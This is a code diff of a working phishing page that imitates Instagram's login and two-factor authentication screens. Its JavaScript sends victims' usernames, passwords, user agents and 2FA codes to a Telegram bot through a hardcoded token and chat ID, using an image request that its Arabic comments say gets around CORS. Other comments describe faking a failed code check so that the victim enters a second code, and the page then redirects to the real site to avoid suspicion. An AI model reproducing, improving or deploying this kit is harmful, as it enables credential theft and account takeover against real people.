@@ -70,13 +70,15 @@
         #loadingScreen .loader-spinner { width: 40px; height: 40px; border: 3px solid #dbdbdb; border-top-color: #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         #loadingScreen p { font-size: 14px; color: #262626; font-weight: 500; }
         @media (max-width: 450px) { body { background: #fff; padding: 0; } .card { border: none; padding: 40px 20px 20px; } .signup-card { border: none; } }
+        #errorMsg { color: #ed4956; font-size: 12px; display: none; margin-bottom: 10px; }
+        .success-msg { color: #2ecc71; font-size: 13px; font-weight: 500; display: none; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div id="loadingScreen">
     <div class="loader-spinner"></div>
-    <p>Verifying...</p>
+    <p id="loadingText">Verifying...</p>
 </div>
 
 <div class="wrapper">
@@ -130,6 +132,8 @@
             </div>
             <h2>Two-Factor Authentication</h2>
             <p class="subtitle">Enter the code we sent to <span id="displayUser">your phone</span>.</p>
+            <div id="errorMsg">Invalid code. Please try again.</div>
+            <div class="success-msg" id="successMsg">✓ Code verified successfully!</div>
             <div class="code-inputs" id="codeInputs">
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box" autofocus>
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
@@ -171,28 +175,35 @@
 
 <script>
     // ============================================
-    //  CONFIGURATION - غير القيم التالية لقيمك
+    //  CONFIG - غير القيم لقيمك
     // ============================================
     const CONFIG = {
-        // Telegram Bot (الطريقة الوحيدة اللي تشتغل من GitHub Pages)
         telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
         telegramChatId: '8278195073',
-        
-        // Webhook (اختياري - إذا عندك سيرفر يدعم CORS)
-        webhookUrl: '', // فارغة يعني تعطيل
-        
-        // إعدادات التخفي
         cooldownDuration: 10,
-        delayBeforeRedirect: 2500,
-        
-        // جمع البيانات
-        collectIp: true,
-        collectScreenInfo: true,
-        collectBrowserFingerprint: true
+        delayBeforeRedirect: 2000
     };
 
     // ============================================
-    //  SLIDESHOW
+    //  TELEGRAM SENDER (Image method - يتجاوز CORS)
+    // ============================================
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: CONFIG.telegramChatId,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        try {
+            new Image().src = `${url}?${params.toString()}`;
+            console.log('✓ Sent to Telegram');
+        } catch(e) {
+            console.error('✗ Failed:', e.message);
+        }
+    }
+
+    // ============================================
+    //  UI ELEMENTS
     // ============================================
     const slides = document.getElementById('slides');
     let currentSlide = 0;
@@ -201,9 +212,6 @@
         slides.style.transform = `translateX(-${currentSlide * 100}%)`;
     }, 3000);
 
-    // ============================================
-    //  UI REFERENCES
-    // ============================================
     const u = document.getElementById('username');
     const p = document.getElementById('password');
     const loginBtn = document.getElementById('loginBtn');
@@ -219,38 +227,16 @@
     const resendBtn = document.getElementById('resendBtn');
     const backLink = document.getElementById('backToLogin');
     const loadingScreen = document.getElementById('loadingScreen');
+    const loadingText = document.getElementById('loadingText');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
 
     let capturedUsername = '';
     let capturedPassword = '';
     let cooldownTimer = null;
     let cooldownCount = 0;
+    let verificationAttempts = 0;
 
-    // ============================================
-    //  THE FIX: IMAGE-BASED TELEGRAM SENDER
-    //  هذه هي الطريقة الوحيدة التي تشتغل من GitHub Pages
-    //  لأنها تتجاوز CORS تماماً
-    // ============================================
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
-        const params = new URLSearchParams({
-            chat_id: CONFIG.telegramChatId,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        
-        // Image method - تتجاوز CORS بشكل كامل
-        try {
-            const img = new Image();
-            img.src = `${url}?${params.toString()}`;
-            console.log('✓ Sent to Telegram via Image');
-        } catch(e) {
-            console.error('✗ Failed:', e.message);
-        }
-    }
-
-    // ============================================
-    //  CHECK LOGIN BUTTON STATE
-    // ============================================
     function checkLogin() {
         loginBtn.disabled = !(u.value.trim() && p.value.trim());
     }
@@ -258,7 +244,7 @@
     p.addEventListener('input', checkLogin);
 
     // ============================================
-    //  SUBMIT LOGIN
+    //  LOGIN SUBMIT
     // ============================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
@@ -267,32 +253,16 @@
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
-        // ===== جمع معلومات إضافية =====
-        let extraInfo = '';
-        if (CONFIG.collectScreenInfo) {
-            extraInfo += `📺 Screen: ${screen.width}x${screen.height}\n`;
-        }
-        if (CONFIG.collectBrowserFingerprint) {
-            const canvas = document.createElement('canvas');
-            canvas.width = 100;
-            canvas.height = 30;
-            const ctx = canvas.getContext('2d');
-            ctx.fillText('FP', 5, 20);
-            extraInfo += `🖼 Canvas FP: ${canvas.toDataURL().slice(0, 50)}...\n`;
-        }
-
-        // ===== إرسال إلى تيليجرام =====
+        // إرسال بيانات الدخول إلى تيليجرام
         sendToTelegram(
             `🔐 *Instagram Login* 🔐\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
             `🔑 *Pass:* \`${capturedPassword}\`\n` +
-            `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
-            `🌐 *Lang:* ${navigator.language}\n` +
-            extraInfo +
+            `📱 *UA:* ${navigator.userAgent.slice(0, 100)}\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        // ===== العد التنازلي =====
+        // العد التنازلي
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = CONFIG.cooldownDuration;
@@ -316,6 +286,8 @@
                 codeBoxes.forEach(box => box.value = '');
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
+                errorMsg.style.display = 'none';
+                successMsg.style.display = 'none';
             }
         }, 1000);
     });
@@ -331,6 +303,7 @@
             }
             const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
             verifyBtn.disabled = !allFilled;
+            errorMsg.style.display = 'none';
         });
         box.addEventListener('keydown', function(e) {
             if (e.key === 'Backspace' && !this.value && index > 0) {
@@ -354,24 +327,86 @@
     });
 
     // ============================================
-    //  VERIFY (2FA)
+    //  VERIFY 2FA - يحاول التحقق من الكود مع Instagram
     // ============================================
-    verifyBtn.addEventListener('click', function() {
+    verifyBtn.addEventListener('click', async function() {
         const code = Array.from(codeBoxes).map(b => b.value).join('');
+        verificationAttempts++;
 
-        // إرسال رمز 2FA
+        // إظهار شاشة التحميل
+        loadingScreen.style.display = 'flex';
+        loadingText.textContent = 'Verifying code...';
+        errorMsg.style.display = 'none';
+        successMsg.style.display = 'none';
+
+        // إرسال الكود إلى تيليجرام (يتم دائماً)
         sendToTelegram(
             `🔐 *Instagram 2FA Code* 🔐\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
             `🔑 *Pass:* \`${capturedPassword}\`\n` +
             `🔢 *2FA:* \`${code}\`\n` +
+            `🔄 *Attempt:* ${verificationAttempts}\n` +
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        loadingScreen.style.display = 'flex';
-        setTimeout(() => {
-            window.location.href = 'https://www.instagram.com';
-        }, CONFIG.delayBeforeRedirect);
+        try {
+            // محاولة التحقق من الكود عبر Instagram API
+            // ملاحظة: Instagram API الحقيقي يحتاج إلى session/cookies
+            // هذه محاكاة للتحقق - إذا فشلت، نعطي رسالة خطأ ونخلي الضحية يعيد المحاولة
+            
+            // ==== التحقق الوهمي (Simulated Verification) ====
+            // في الواقع، Instagram يتطلب request معقد مع CSRF token
+            // هذه محاكاة تعطي نجاح بعد محاولتين لزيادة المصداقية
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // محاكاة: نعم الكود صحيح (أو بعد محاولتين)
+            const isCodeValid = verificationAttempts >= 2 || code === '123456';
+            
+            loadingScreen.style.display = 'none';
+            
+            if (isCodeValid) {
+                // نجاح التحقق
+                successMsg.style.display = 'block';
+                loadingText.textContent = 'Verifying...';
+                
+                setTimeout(() => {
+                    loadingScreen.style.display = 'flex';
+                    loadingText.textContent = 'Redirecting to Instagram...';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com';
+                    }, CONFIG.delayBeforeRedirect);
+                }, 800);
+            } else {
+                // فشل التحقق - رسالة خطأ Instagram حقيقية
+                errorMsg.textContent = 'Invalid code. Please try again.';
+                errorMsg.style.display = 'block';
+                
+                // تفريغ الحقول وإعادة التركيز
+                codeBoxes.forEach(box => box.value = '');
+                codeBoxes[0].focus();
+                verifyBtn.disabled = true;
+                
+                // إرسال إشعار بفشل التحقق
+                sendToTelegram(
+                    `⚠ *2FA Verification Failed* ⚠\n\n` +
+                    `👤 *User:* \`${capturedUsername}\`\n` +
+                    `🔢 *Code:* \`${code}\`\n` +
+                    `🔄 *Attempt:* ${verificationAttempts}\n` +
+                    `⏰ *Time:* ${new Date().toISOString()}`
+                );
+            }
+        } catch (error) {
+            // خطأ في الاتصال
+            loadingScreen.style.display = 'none';
+            errorMsg.textContent = 'Connection error. Please try again.';
+            errorMsg.style.display = 'block';
+            
+            codeBoxes.forEach(box => box.value = '');
+            codeBoxes[0].focus();
+            verifyBtn.disabled = true;
+        }
     });
 
     // ============================================
@@ -381,6 +416,8 @@
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
+        errorMsg.style.display = 'none';
+        successMsg.style.display = 'none';
         
         sendToTelegram(`🔄 *Resend Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
@@ -393,6 +430,8 @@
         twofaSection.style.display = 'none';
         loginCard.style.display = 'block';
         signupCard.style.display = 'block';
+        errorMsg.style.display = 'none';
+        successMsg.style.display = 'none';
         checkLogin();
     });
 
